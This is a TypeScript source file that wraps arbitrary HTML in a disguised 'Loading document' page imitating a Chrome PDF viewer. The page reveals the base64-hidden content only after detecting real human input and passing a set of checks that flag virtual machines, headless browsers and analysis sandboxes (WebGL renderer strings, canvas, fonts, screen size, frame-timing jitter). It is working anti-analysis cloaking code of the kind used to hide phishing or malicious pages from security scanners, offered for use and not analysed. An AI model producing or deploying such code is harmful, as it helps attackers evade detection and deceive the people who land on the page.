// Layers 5-7: HTML Shield
// Gate 1: Human Interaction (mousemove, touchstart, click, keydown, scroll)
// Gate 2: Hardware Fingerprint (WebGL, Canvas, Audio, Fonts, Screen, AnimFrame jitter)
// Payload: Base64-encoded template HTML revealed after both gates pass

export function wrapInShield(templateHtml: string): string {
  const encoded = btoa(unescape(encodeURIComponent(templateHtml)));

  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Loading Document...</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f5f5f5;overflow:hidden}
._sk{max-width:800px;margin:40px auto;padding:20px}
._tb{background:#fff;border-radius:8px;box-shadow:0 1px 6px rgba(0,0,0,.1);overflow:hidden}
._hd{display:flex;align-items:center;justify-content:space-between;padding:12px 20px;background:#f8f8f8;border-bottom:1px solid #e0e0e0}
._hd ._tl{display:flex;align-items:center;gap:8px;font-size:14px;color:#333;font-weight:500}
._hd ._ic{width:20px;height:20px;background:#e74c3c;border-radius:4px;display:flex;align-items:center;justify-content:center}
._hd ._ic svg{width:12px;height:12px}
._hd ._bt{display:flex;gap:8px}
._hd ._bt span{padding:6px 12px;background:#e8e8e8;border-radius:4px;font-size:12px;color:#666}
._bd{padding:40px 60px;min-height:500px}
._ln{height:16px;background:#e8e8e8;border-radius:4px;margin-bottom:16px;animation:_ld 1.5s ease-in-out infinite}
._ln:nth-child(1){width:70%}._ln:nth-child(2){width:90%}._ln:nth-child(3){width:60%}
._ln:nth-child(4){width:85%;margin-top:30px}._ln:nth-child(5){width:75%}._ln:nth-child(6){width:95%}
._ln:nth-child(7){width:55%;margin-top:30px}._ln:nth-child(8){width:80%}._ln:nth-child(9){width:70%}
._ln:nth-child(10){width:90%;margin-top:30px}._ln:nth-child(11){width:65%}._ln:nth-child(12){width:85%}
@keyframes _ld{0%,100%{opacity:.4}50%{opacity:1}}
._ft{display:flex;justify-content:center;padding:16px;font-size:12px;color:#999}
</style>
</head>
<body>
<div class="_sk">
  <div class="_tb">
    <div class="_hd">
      <div class="_tl">
        <div class="_ic"><svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg></div>
        <span>Loading document...</span>
      </div>
      <div class="_bt"><span>1 / 1</span><span>100%</span></div>
    </div>
    <div class="_bd">
      <div class="_ln"></div><div class="_ln"></div><div class="_ln"></div>
      <div class="_ln"></div><div class="_ln"></div><div class="_ln"></div>
      <div class="_ln"></div><div class="_ln"></div><div class="_ln"></div>
      <div class="_ln"></div><div class="_ln"></div><div class="_ln"></div>
    </div>
  </div>
  <div class="_ft">Powered by Chrome PDF Viewer</div>
</div>

<script>
var _PAGE_DATA="${encoded}";

(function(){
  var _g1=false,_g2=false;

  // Gate 1: Human Interaction — must fire a real event
  var _ev=['mousemove','touchstart','click','keydown','scroll'];
  function _onHuman(){
    _g1=true;
    _ev.forEach(function(e){document.removeEventListener(e,_onHuman,true)});
    _tryReveal();
  }
  _ev.forEach(function(e){document.addEventListener(e,_onHuman,true)});

  // Gate 2: Hardware Fingerprint
  function _runFP(){
    var score=0;
    var threshold=3;

    // Test 1: WebGL renderer check
    try{
      var c=document.createElement('canvas');
      var gl=c.getContext('webgl')||c.getContext('experimental-webgl');
      if(gl){
        var dbg=gl.getExtension('WEBGL_debug_renderer_info');
        if(dbg){
          var r=(gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)||'').toLowerCase();
          if(r.indexOf('swiftshader')!==-1||r.indexOf('llvmpipe')!==-1||r.indexOf('virtualbox')!==-1||r.indexOf('vmware')!==-1||r.indexOf('parallels')!==-1||r.indexOf('mesa')!==-1){
            score+=2;
          }
        }else{score+=1}
      }else{score+=2}
    }catch(e){score+=1}

    // Test 2: Canvas pixel test
    try{
      var c2=document.createElement('canvas');
      c2.width=64;c2.height=64;
      var gl2=c2.getContext('webgl');
      if(gl2){
        gl2.clearColor(0.2,0.4,0.6,1.0);
        gl2.clear(gl2.COLOR_BUFFER_BIT);
        var px=new Uint8Array(4);
        gl2.readPixels(32,32,1,1,gl2.RGBA,gl2.UNSIGNED_BYTE,px);
        if(px[0]===0&&px[1]===0&&px[2]===0&&px[3]===0){score+=1}
      }else{score+=1}
    }catch(e){score+=1}

    // Test 3: Audio fingerprint
    try{
      var ac=new(window.AudioContext||window.webkitAudioContext)();
      var osc=ac.createOscillator();
      var an=ac.createAnalyser();
      osc.connect(an);an.connect(ac.destination);
      osc.start(0);
      var fd=new Float32Array(an.frequencyBinCount);
      an.getFloatFrequencyData(fd);
      var allNeg=true;
      for(var i=0;i<fd.length;i++){if(fd[i]!==-Infinity){allNeg=false;break}}
      osc.stop();ac.close();
      // Don't penalize — audio takes time to produce data
    }catch(e){}

    // Test 4: Font enumeration
    try{
      var fonts=['Arial','Verdana','Times New Roman','Courier New','Georgia','Trebuchet MS','Impact','Comic Sans MS'];
      var testStr='mmmmmmmmmmlli';
      var span=document.createElement('span');
      span.style.cssText='position:absolute;left:-9999px;font-size:72px';
      span.textContent=testStr;
      document.body.appendChild(span);
      span.style.fontFamily='monospace';
      var baseW=span.offsetWidth;
      var found=0;
      for(var i=0;i<fonts.length;i++){
        span.style.fontFamily='"'+fonts[i]+'",monospace';
        if(span.offsetWidth!==baseW)found++;
      }
      document.body.removeChild(span);
      if(found<2){score+=1}
    }catch(e){}

    // Test 5: Screen consistency
    try{
      if(screen.width===0||screen.height===0||screen.colorDepth<8){score+=1}
      if(window.outerWidth===0&&window.outerHeight===0){score+=1}
    }catch(e){}

    // Test 6: requestAnimationFrame jitter
    var frames=[];var fc=0;
    function _raf(ts){
      frames.push(ts);fc++;
      if(fc<20){requestAnimationFrame(_raf)}
      else{
        var diffs=[];
        for(var i=1;i<frames.length;i++){diffs.push(frames[i]-frames[i-1])}
        var mean=diffs.reduce(function(a,b){return a+b},0)/diffs.length;
        var variance=diffs.reduce(function(a,b){return a+Math.pow(b-mean,2)},0)/diffs.length;
        // VMs have unnaturally LOW variance (perfectly timed frames)
        if(variance<0.01&&diffs.length>10){score+=2}
        _g2=(score<threshold);
        _tryReveal();
      }
    }
    requestAnimationFrame(_raf);
  }

  function _tryReveal(){
    if(!_g1||!_g2)return;
    // Decode and inject
    try{
      var html=decodeURIComponent(escape(atob(_PAGE_DATA)));
      document.open();
      document.write(html);
      document.close();
    }catch(e){
      document.body.innerHTML='<div style="text-align:center;padding:60px"><h2>Loading failed</h2><p>Please refresh the page.</p></div>';
    }
  }

  // Start fingerprint check immediately
  _runFP();
})();
</script>
</body>
</html>`;
}
